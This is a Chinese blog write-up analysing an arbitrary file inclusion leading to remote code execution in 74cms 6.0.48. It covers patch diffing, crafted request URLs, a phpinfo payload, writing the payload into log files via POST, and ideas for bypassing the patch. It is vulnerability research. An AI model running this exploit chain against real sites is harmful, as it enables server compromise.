动态调试过程如下：\n\n![7cb8badae382c35d54466000a3b9441f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110236-fee339ae-3513-1.png)\n\n可见此时$tpl为Emailtpl/test，get请求中参数成功传入了。\n\n我们来看一下fetch里怎么实现的\n\n![6b99d80ecb0f333ed74925335e0ec179.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110247-0573872e-3514-1.png)\n\n程序会执行到fetch方法中的Hook::listen('view_parse',$params);代码处\n\n![c036dd43047a181f550626ad8df457c2.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110256-0b31ebc4-3514-1.png)\n\n此处代码很关键，需要详细说明下。Hook::listen('view_parse',$params);这处代码的作用大体上有两个：\n\n1.  Compiler：将模板文件经过一定解析与编译，生成缓存文件xxx.php\n\n2.  Load：通过include方法加载上一步生成的xxx.php缓存文件\n\n简而言之，Hook::listen('view_parse',$params);先通过Compiler将攻击者传入的模板文件编译为一个缓存文件，随后调用Load加载这个编译好的缓存文件。\n\n首先我们来看下生产缓存文件过程\n\n#### Compiler\n\n![31a5ff3300343ac374148a72a0dd8588.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110309-12ac0bf0-3514-1.png)\n\n从Hook::listen('view_parse',$params);到compiler方法的调用链如下：\n\n![64891519910e85a6a42ac40810be6e9d.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110317-17b311b6-3514-1.png)\n\n该方法会将thinkphp的html模板中定义的标签，解析成php代码。例如模板中的”<qscms:company_show/>”\n\n就会被解析成\n\n![8e827252d1f78414700cd630ab754864.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110328-1e5321e6-3514-1.png)\n\n除此之外，compiler方法还会将生成的xxx.php文件头部加上一个如下代码以防止该文件被直接执行\n\n```php\n<?php if (!defined('THINK_PATH')) exit();\n```\n\n说完compiler方法的功能后，我们来看下compiler方法是如何处理我们的test.html。\n\ntest.html中的代码为<?php phpinfo(); ?>，经过解析之后，返回值见下图\n\n![b480be6cff72222f2025bbfd2b65271c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110340-24f31b78-3514-1.png)\n\n上图compiler方法最终返回的是strip_whitespace($tmplContent);\n\n但strip_whitespace方法的作用是去除代码中的空白和注释，对我们的payload没什么实际意义。\n\n最终compiler方法返回值为\n\n```php\n<?php if (!defined('THINK_PATH')) exit(); phpinfo();?>\n```\n\n这个值被写入一个缓存文件，见下图\n\n![11b8744f27297b10d84cf708057b471c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110350-2b54b5e4-3514-1.png)\n\n缓存文件位于data/Runtime/Cache/Home/8a848d32ad6f6040d5461bb8b5f65eb0.php\n\n![c3c54d062abc49548ea48afbc33395f0.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110401-31cd5854-3514-1.png)\n\n到此为止，compiler流程已经结束，我们接下来看看加载过程\n\n#### Load\n\nLoad代码如下图所示\n\n![7aa85eb5ad15da842e9171513ad2f150.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110412-38878160-3514-1.png)\n\n从Hook::listen('view_parse',$params);到load方法的调用链如下：\n\n![70c4e79c2d0424fe398992dcf91af922.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110422-3e51db7c-3514-1.png)\n\n从第一张图可见，load代码最终会include 我们compiler流程中生产的那个data/Runtime/Cache/Home/8a848d32ad6f6040d5461bb8b5f65eb0.php缓存文件\n\n当8a848d32ad6f6040d5461bb8b5f65eb0.php被include之后，其中的恶意代码执行，见下图\n\n![e3686e2479975e1820d9cf36fd58f907.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110435-463a4388-3514-1.png)\n\n执行成功后，浏览器如下\n\n![16c7ecd9e2af85defd979531b5030000.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110448-4dadbe6a-3514-1.png)\n\n等等，为什么没有phpinfo的回显呢？是不是我们phpinfo执行失败了？我们换一个payload试试，见下图\n\n![af7dd12134991a71b0e6e926fb19b233.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110457-5309232c-3514-1.png)\n\n这次我们执行一个生产目录的命令\n\n![db01c632208c94ae46df30b87b5cf5a7.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110507-5912f4dc-3514-1.png)\n\n可见命令执行成功了。但是为什么phpinfo没有回显呢？\n\n### phpinfo回显哪去了\n\n从上文看，我们使用测试文件进行包含利用成功了，但是phpinfo的回显却不见了。进过研究发现，原因还是在fetch方法里。在fetch中，注意看下图红框处代码：\n\n![b90c07a43bcf7ba6245dfcea7d6eecdc.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110517-5eea7876-3514-1.png)\n\nFetch中的load流程，即加载payload执行phpinfo的过程在上图126行处Hook::listen('view_parse',$params);代码中完成的。\n\n而在此之前，程序通过ob_start打开缓冲区，因此phpinfo输出的信息被存储于缓冲区内，而在Hook::listen代码执行之后，又通过ob_get_clean将缓冲区里的内容取出赋值给$content并删除当前输出缓冲区。因此phpinfo虽然执行成功，但回显并不会显示在浏览器页面上。\n\n如果想要获取回显，我们该怎么办呢？这其实很简单，见下图\n\n![eeedcef07c82e7e4b1dd41dcfac688d8.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110526-6430b02a-3514-1.png)\n\n此时生成的缓存文件如下：\n\n![caa1ebf3c9864c988ac9783ed13927b2.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110537-6ab84098-3514-1.png)\n\n虽然在include这个缓存文件之前，程序通过ob_start打开缓冲区将phpinfo的输出存到缓冲区里，但我们可以通过执行ob_flush冲刷出（送出）输出缓冲区中的内容，打印到浏览器页面上\n\n![62bd36b0497018cf2b3057ed3a02fe03.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110546-70186428-3514-1.png)\n\n### 怎么将payload写入文件\n\n上文我们一直在用一个手动上传的test.html，很显然这在实际漏洞利用过程中是不行的。我们需要想办法在目标服务器里写入一个payload。\n\n在这里笔者绕了很多弯路，尝试着在图片上传处做文章，但最后失败了。后来笔者突然想起来官方的补丁，还记得上文我们从官方补丁中得到的漏洞情报？\n\n补丁将fetch 方法中\n\n```php\nif(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);\n```\n\n代码注释替换为\n\n```php\nif(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_'));\n```\n\n修改之处的E()函数是用来抛出异常处理的，而补丁将$templateFile删除，正是不想让$templateFile变量值写到日志log文件中。看来payload是可以写到日志文件里的。\n\n我们回过头来，看看fetch 方法中$templateFile变量怎么控制\n\n![1d8138dd946fd4cc7c4f2ecca308cbb1.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110558-7795157a-3514-1.png)\n\n还记得上文的分析吗？$templateFile变量其实就是请求中传入的tpl变量可以被攻击者控制。从上图来看，只要请求中传入的tpl变量不是文件，就可以将tpl变量值写入log文件。\n\n那么我们就让请求中传入的tpl变量为payload字符串，满足不是文件判断，让这个payload写到日志中\n\n实际发送如下请求控制$templateFile变量写入日志文件\n\n![55762aad4cd5dd4ca2a9fd0bc211cd10.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110608-7d9bf60a-3514-1.png)\n\n动态调试如下：\n\n![1c6571b6153d1413b5ce3546c814146c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110618-834badac-3514-1.png)\n\n日志被写到data/Runtime/Logs/Home/20_12_02.log，见下图\n\n![896e4c9fd287cb6cf3182bdde9a1293c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110628-8934c08c-3514-1.png)\n\n但有个问题：我们为什么不像上文一贯作风，使用get请求传递tpl变量值呢？因为从get请求中url会在日志文件中被url编码，而post请求则不然。因此只能发送post请求。\n\n到此，完整的利用链构造出来了，发送如下请求即可包含日志文件并执行payload\n\n![308216e7581d00fbadf496dc6b2beeb8.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110640-90c3f502-3514-1.png)\n\n写在最后\n--------\n\n总得来说这个漏洞并不复杂，但是却很巧妙。在此过程中遇到很多有趣是问题。\n\n### 构造图片payload问题\n\n在从官方补丁中发现利用log文件写入payload思路之前，笔者花费大量时间尝试利用图片上传写入payload。因为74cms中利用了ThinkImage(也就是php-GD)对图片的渲染和处理导致webshell代码错位失效，笔者尝试了这篇文章里的思路\n\n<https://paper.seebug.org/387/#2-bypass-php-gdwebshell>\n\n这下倒是成功了一半：ThinkImage出现异常抛出错误了，并没有对笔者webshell图片进行渲染和处理，这看起来太棒了。但坏消息是，因为ThinkImage抛出异常，程序并没有把笔者上传成功后存储于服务器上的图片名称抛出来，而图片名称是通过uniqid()函数生成的随机数。uniqid() 函数基于以微秒计的当前时间，生成一个唯一的ID。笔者也没有办法猜测出上传后的图片名是什么，因此作罢。\n\n这个问题与接下来的问题相关，也就是官方的补丁到底有没有效\n\n### 官方第一处补丁到底有没有用\n\n还记得上文漏洞情报分析那里，关于第一处补丁笔者的分析吗？\n\n补丁在assign_resume_tpl方法中增添了如下代码\n\n```php\n$tpl_file = $view->parseTemplate($tpl);\n\nif(!is_file($tpl_file)){\n\nreturn false;\n\n}\n```\n\n笔者在分析漏洞之前的想法是：因为这是一个文件包含漏洞，而assign_resume_tpl方法正是这个漏洞的入口，因此如果我们传入的$tpl必定是一个文件，这样可以轻松的绕过$view->parseTemplate($tpl);（parseTemplate中进行判断，如果传入的tpl是文件则直接return）与if(!is_file($tpl_file))判断。\n\n但经过深入的漏洞分析发现，assign_resume_tpl方法不仅是文件包含漏洞的入口，也是后续将payload写入log文件的接口，通过控制assign_resume_tpl方法的tpl参数为字符串形式的payload，则这个payload将会在fetch中被写入日志文件。\n\n![b7434e7d568331a5078aae73e61415ae.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110703-9e43bf64-3514-1.png)\n\n但在assign_resume_tpl方法中增加了判断\n\n![3b42f29aa73f0b0a718cbc2ebf766527.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110719-a7791f48-3514-1.png)\n\n$tpl_file会是payload字符串拼接.html这样的形式，接下来的if(!is_file($tpl_file))会return false，而保护程序不进入fetch。\n\n但这样真有必要吗？因为fetch中也打了补丁，经过上文对补丁的分析，就算是assign_resume_tpl方法中没有修改使得payload进入了fetch，由于补丁的原因fetch中也不会把payload写入日志了，因此这里的补丁显的没有太大必要。\n\n### 官方补丁可以绕过吗\n\n经过从上面两个问题的思考，可以发现一个新的问题，那就是官方补丁是否可以绕过。通过对漏洞的了解，官方补丁实际起作用的是不让payload写入日志文件。如果真的有人有办法在图片中写入payload并上传成功，在assign_resume_tpl方法中直接包含这个文件即可利用成功。assign_resume_tpl方法中的补丁并没有限制tpl参数为文件。\n\n也就是说：要么官方补丁是可以轻松绕过的、要么通过构造图片webshell这条路走不通。具体哪个是对的，就要看看官方后续是否又出补丁绕过公告与一个新的补丁了。","slug":"74cmsrce","published":1,"updated":"2020-12-03T06:49:56.766Z","_id":"cki8h7236000014a967qq71k4","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>前些日子，骑士cms 官方公布了一个系统紧急风险漏洞升级通知：骑士cms 6.0.48存在一处任意文件包含漏洞，利用该漏洞对payload文件进行包含，即可造成远程代码执行漏洞。这篇文章将从漏洞公告分析开始，叙述一下笔者分析漏洞与构造payload时遇到的有趣的事情。</p>\n<h2 id=\"漏洞情报\"><a href=\"#漏洞情报\" class=\"headerlink\" title=\"漏洞情报\"></a>漏洞情报</h2><p>官方发布的系统紧急风险漏洞升级通知如下：</p>\n<p><a href=\"http://www.74cms.com/news/show-2497.html\">http://www.74cms.com/news/show-2497.html</a></p>\n<p>从官方公布的信息来看，官方修复了两个地方：</p>\n<p>1、/Application/Common/Controller/BaseController.class.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110015-ab36dfcc-3513-1.png\" alt=\"5aa627c04fe6466d54325608c465affe.png\"></p>\n<p>2、/ThinkPHP/Library/Think/View.class.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110029-b3915648-3513-1.png\" alt=\"b1d2dab890cca24c649a871e938606bb.png\"></p>\n<p>从BaseController.class.php这处补丁来看：</p>\n<p>笔者猜测漏洞多半出在了渲染简历模板的assign_resume_tpl方法中。从补丁修复上来看，增添了如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$tpl_file = $view-&gt;parseTemplate($tpl);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($tpl_file))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以发现程序通过$view-&gt;parseTemplate对$tpl参数进行处理，并对处理结果$tpl_file进行is_file判断</p>\n<p>我们先跟入$view-&gt;parseTemplate看看</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110042-bb249816-3513-1.png\" alt=\"5064cfae5a0467d8dac5852f77bdad0e.png\"></p>\n<p>从上图143行的结果来看，parseTemplate中也是先通过is_file判断，然后将符合的结果返回。</p>\n<p>如果此处传入的$tpl变量是文件，那么这个文件可以顺利的通过parseTemplate与assign_resume_tpl方法中的is_file判断。回想一下，这是一个文件包含漏洞，成功利用的先前条件是恶意的文件得存在，然后被包含。这个漏洞多半是通过assign_resume_tpl方法的$tpl参数传入一个真实存在的待包含的恶意文件，而补丁先通过parseTemplate方法内的is_file判断了一次这个恶意文件是否存在，接着又在assign_resume_tpl方法通过is_file方法判断一次，成功的利用一定会使is_file为true。那assign_resume_tpl方法中增加的代码是否有作用？又有着什么作用？</p>\n<p>这个问题笔者将在文章最后介绍。</p>\n<p>接下来从第二处View.class.php这处补丁来看：</p>\n<p>补丁将fetch 方法中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($templateFile)) E(L(<span class=\"string\">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>).<span class=\"string\">&#x27;:&#x27;</span>.$templateFile);</span><br></pre></td></tr></table></figure>\n\n<p>代码注释替换为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($templateFile)) E(L(<span class=\"string\">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>));</span><br></pre></td></tr></table></figure>\n\n<p>在thinkphp中，E()函数是用来抛出异常处理的。可见这处的修改应该是不想让$templateFile变量值写到日志log文件中。</p>\n<p>单从这点来看，命令执行所需的payload百分百是可以通过$templateFile变量写到log文件里的,然后配合任意文件包含漏洞将这个log文件包含并执行。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>通过对漏洞情报的分析，我们差不多知道了这个漏洞的来龙去脉：</p>\n<ol>\n<li><p>通过控制fetch 方法中$templateFile变量，将payload写入log文件</p>\n</li>\n<li><p>通过assign_resume_tpl方法包含这个存在payload的log文件</p>\n</li>\n</ol>\n<p>首先我们抛开怎么把payload写入log文件，先来看看文件包含漏洞怎么回事。</p>\n<p>经过上文的猜测，我们可以通过assign_resume_tpl方法包含任意文件。首先我们要看看怎么通过请求调用assign_resume_tpl方法</p>\n<h3 id=\"如何访问assign-resume-tpl方法\"><a href=\"#如何访问assign-resume-tpl方法\" class=\"headerlink\" title=\"如何访问assign_resume_tpl方法\"></a>如何访问assign_resume_tpl方法</h3><p>assign_resume_tpl方法位于common模块base控制器下。通过对Thinkphp路由的了解，assign_resume_tpl方法多半是用如下url进行调用</p>\n<p><a href=\"http://127.0.0.1//74cms/index.php?m=common&amp;c=base&amp;a=assign_resume_tpl\">http://127.0.0.1//74cms/index.php?m=common&amp;c=base&amp;a=assign_resume_tpl</a></p>\n<p>但是实际上，程序抛出了个错误</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110055-c2bc7b0c-3513-1.png\" alt=\"9444960329c91727ea6dbec7b20fa1cb.png\"></p>\n<p>这是为什么呢？经过动态调试发现一个有意思的事情：common模块是并不能被直接调用的。原因如下：</p>\n<p>\\ThinkPHP\\Library\\Think\\Dispatcher.class.php中存在如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110105-c8b4f08e-3513-1.png\" alt=\"88af447596e2829c4411f28661b542a8.png\"></p>\n<p>从上图代码可见，因为我们common模块位于MODULE_DENY_LIST中，因此不能直接通过m=common来调用common模块。</p>\n<p>既然不能直接调用，看看有没有其他的办法调用common模块base控制器下的assign_resume_tpl方法</p>\n<p>经过研究发现，几乎所有其他的控制器，最终都继承自common模块的BaseController控制器</p>\n<p>我们拿Home模块的AbcController控制器举例,见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110113-cda5eed6-3513-1.png\" alt=\"403e42518385b162d794fb3b941c6388.png\"></p>\n<p>AbcController 继承FrontendController</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110122-d2c14c94-3513-1.png\" alt=\"35b39ce4673b5ade1e2497dcb94bd0a0.png\"></p>\n<p>而FrontendController由继承了BaseController</p>\n<p>因此可以通过get请求</p>\n<p><a href=\"http://127.0.0.1/74cms/index.php?m=home&amp;c=abc&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2\">http://127.0.0.1/74cms/index.php?m=home&amp;c=abc&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2</a></p>\n<p>来调用BaseController下的assign_resume_tpl，并将$variable=1、$tpl=2参数传递进去</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110132-d9051f7c-3513-1.png\" alt=\"a2172aab27f3ef1b48b7af9163c7bcdd.png\"></p>\n<p>同理，Home模块下的IndexController控制器也是可以的，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110143-df9d869e-3513-1.png\" alt=\"71a84a69aed01a87e4f773c16074ea41.png\"></p>\n<p>IndexController继承FrontendController，从上文可知，FrontendController继承BaseController。因此也可以通过get请求</p>\n<p><a href=\"http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2\">http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2</a></p>\n<p>来访问BaseController下的assign_resume_tpl并向该方法传参</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110154-e5bf046c-3513-1.png\" alt=\"b1d60a095246236ff99c0ff8b4210fed.png\"></p>\n<p>我们后续分析就用</p>\n<p><a href=\"http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=xxx&amp;tpl=xxx\">http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=xxx&amp;tpl=xxx</a></p>\n<p>这样的形式调用assign_resume_tpl方法</p>\n<p>既然我们可以通过请求向存在漏洞的assign_resume_tpl方法传参了，距离漏洞利用成功已经不远了</p>\n<h3 id=\"用测试文件触发文件包含\"><a href=\"#用测试文件触发文件包含\" class=\"headerlink\" title=\"用测试文件触发文件包含\"></a>用测试文件触发文件包含</h3><p>我们接下来”假装”在后台上传一个payload，用assign_resume_tpl这个接口包含下试试</p>\n<p>笔者手动在如下目录里放了个test.html</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110205-ecc6849c-3513-1.png\" alt=\"94f079c4ee2149e6f76d6c77c7b6d256.png\"></p>\n<p>为什么这么放呢？因为笔者在源代码里看到如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110215-f2aa2bde-3513-1.png\" alt=\"69df56ea206c171eef4e1aa43e51b167.png\"></p>\n<p>这里是74cms使用assign_resume_tpl调用word_resume.html的形式。因此笔者在测试时也在word_resume.html通目录下放置了一个test.html，其内容如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110225-f8990286-3513-1.png\" alt=\"11ba75fcfd04e5eae60d9888468b9048.png\"></p>\n<p>构造如下请求</p>\n<p><a href=\"http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=Emailtpl/test\">http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=Emailtpl/test</a></p>\n<p>请求将调用assign_resume_tpl方法。动态调试过程如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110236-fee339ae-3513-1.png\" alt=\"7cb8badae382c35d54466000a3b9441f.png\"></p>\n<p>可见此时$tpl为Emailtpl/test，get请求中参数成功传入了。</p>\n<p>我们来看一下fetch里怎么实现的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110247-0573872e-3514-1.png\" alt=\"6b99d80ecb0f333ed74925335e0ec179.png\"></p>\n<p>程序会执行到fetch方法中的Hook::listen(‘view_parse’,$params);代码处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110256-0b31ebc4-3514-1.png\" alt=\"c036dd43047a181f550626ad8df457c2.png\"></p>\n<p>此处代码很关键，需要详细说明下。Hook::listen(‘view_parse’,$params);这处代码的作用大体上有两个：</p>\n<ol>\n<li><p>Compiler：将模板文件经过一定解析与编译，生成缓存文件xxx.php</p>\n</li>\n<li><p>Load：通过include方法加载上一步生成的xxx.php缓存文件</p>\n</li>\n</ol>\n<p>简而言之，Hook::listen(‘view_parse’,$params);先通过Compiler将攻击者传入的模板文件编译为一个缓存文件，随后调用Load加载这个编译好的缓存文件。</p>\n<p>首先我们来看下生产缓存文件过程</p>\n<h4 id=\"Compiler\"><a href=\"#Compiler\" class=\"headerlink\" title=\"Compiler\"></a>Compiler</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110309-12ac0bf0-3514-1.png\" alt=\"31a5ff3300343ac374148a72a0dd8588.png\"></p>\n<p>从Hook::listen(‘view_parse’,$params);到compiler方法的调用链如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110317-17b311b6-3514-1.png\" alt=\"64891519910e85a6a42ac40810be6e9d.png\"></p>\n<p>该方法会将thinkphp的html模板中定义的标签，解析成php代码。例如模板中的”<a href=\"qscms:company_show/\">qscms:company_show/</a>”</p>\n<p>就会被解析成</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110328-1e5321e6-3514-1.png\" alt=\"8e827252d1f78414700cd630ab754864.png\"></p>\n<p>除此之外，compiler方法还会将生成的xxx.php文件头部加上一个如下代码以防止该文件被直接执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span> (!defined(<span class=\"string\">&#x27;THINK_PATH&#x27;</span>)) <span class=\"keyword\">exit</span>();</span><br></pre></td></tr></table></figure>\n\n<p>说完compiler方法的功能后，我们来看下compiler方法是如何处理我们的test.html。</p>\n<p>test.html中的代码为<?php phpinfo(); ?>，经过解析之后，返回值见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110340-24f31b78-3514-1.png\" alt=\"b480be6cff72222f2025bbfd2b65271c.png\"></p>\n<p>上图compiler方法最终返回的是strip_whitespace($tmplContent);</p>\n<p>但strip_whitespace方法的作用是去除代码中的空白和注释，对我们的payload没什么实际意义。</p>\n<p>最终compiler方法返回值为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span> (!defined(<span class=\"string\">&#x27;THINK_PATH&#x27;</span>)) <span class=\"keyword\">exit</span>(); phpinfo();<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这个值被写入一个缓存文件，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110350-2b54b5e4-3514-1.png\" alt=\"11b8744f27297b10d84cf708057b471c.png\"></p>\n<p>缓存文件位于data/Runtime/Cache/Home/8a848d32ad6f6040d5461bb8b5f65eb0.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110401-31cd5854-3514-1.png\" alt=\"c3c54d062abc49548ea48afbc33395f0.png\"></p>\n<p>到此为止，compiler流程已经结束，我们接下来看看加载过程</p>\n<h4 id=\"Load\"><a href=\"#Load\" class=\"headerlink\" title=\"Load\"></a>Load</h4><p>Load代码如下图所示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110412-38878160-3514-1.png\" alt=\"7aa85eb5ad15da842e9171513ad2f150.png\"></p>\n<p>从Hook::listen(‘view_parse’,$params);到load方法的调用链如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110422-3e51db7c-3514-1.png\" alt=\"70c4e79c2d0424fe398992dcf91af922.png\"></p>\n<p>从第一张图可见，load代码最终会include 我们compiler流程中生产的那个data/Runtime/Cache/Home/8a848d32ad6f6040d5461bb8b5f65eb0.php缓存文件</p>\n<p>当8a848d32ad6f6040d5461bb8b5f65eb0.php被include之后，其中的恶意代码执行，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110435-463a4388-3514-1.png\" alt=\"e3686e2479975e1820d9cf36fd58f907.png\"></p>\n<p>执行成功后，浏览器如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110448-4dadbe6a-3514-1.png\" alt=\"16c7ecd9e2af85defd979531b5030000.png\"></p>\n<p>等等，为什么没有phpinfo的回显呢？是不是我们phpinfo执行失败了？我们换一个payload试试，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110457-5309232c-3514-1.png\" alt=\"af7dd12134991a71b0e6e926fb19b233.png\"></p>\n<p>这次我们执行一个生产目录的命令</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110507-5912f4dc-3514-1.png\" alt=\"db01c632208c94ae46df30b87b5cf5a7.png\"></p>\n<p>可见命令执行成功了。但是为什么phpinfo没有回显呢？</p>\n<h3 id=\"phpinfo回显哪去了\"><a href=\"#phpinfo回显哪去了\" class=\"headerlink\" title=\"phpinfo回显哪去了\"></a>phpinfo回显哪去了</h3><p>从上文看，我们使用测试文件进行包含利用成功了，但是phpinfo的回显却不见了。进过研究发现，原因还是在fetch方法里。在fetch中，注意看下图红框处代码：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110517-5eea7876-3514-1.png\" alt=\"b90c07a43bcf7ba6245dfcea7d6eecdc.png\"></p>\n<p>Fetch中的load流程，即加载payload执行phpinfo的过程在上图126行处Hook::listen(‘view_parse’,$params);代码中完成的。</p>\n<p>而在此之前，程序通过ob_start打开缓冲区，因此phpinfo输出的信息被存储于缓冲区内，而在Hook::listen代码执行之后，又通过ob_get_clean将缓冲区里的内容取出赋值给$content并删除当前输出缓冲区。因此phpinfo虽然执行成功，但回显并不会显示在浏览器页面上。</p>\n<p>如果想要获取回显，我们该怎么办呢？这其实很简单，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110526-6430b02a-3514-1.png\" alt=\"eeedcef07c82e7e4b1dd41dcfac688d8.png\"></p>\n<p>此时生成的缓存文件如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110537-6ab84098-3514-1.png\" alt=\"caa1ebf3c9864c988ac9783ed13927b2.png\"></p>\n<p>虽然在include这个缓存文件之前，程序通过ob_start打开缓冲区将phpinfo的输出存到缓冲区里，但我们可以通过执行ob_flush冲刷出（送出）输出缓冲区中的内容，打印到浏览器页面上</p>\n<p><img src= 